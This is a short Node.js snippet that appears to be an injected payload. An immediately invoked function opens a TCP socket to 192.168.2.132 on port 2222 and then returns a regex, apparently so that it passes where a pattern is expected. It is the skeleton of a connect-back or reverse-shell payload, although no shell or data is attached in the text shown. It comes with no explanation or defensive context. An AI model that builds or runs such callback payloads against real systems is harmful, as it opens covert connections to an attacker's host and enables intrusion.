(function() {
    const net = require('net');

    const client = new net.Socket();
    client.connect(2222, '192.168.2.132');
    return /a/;
})();
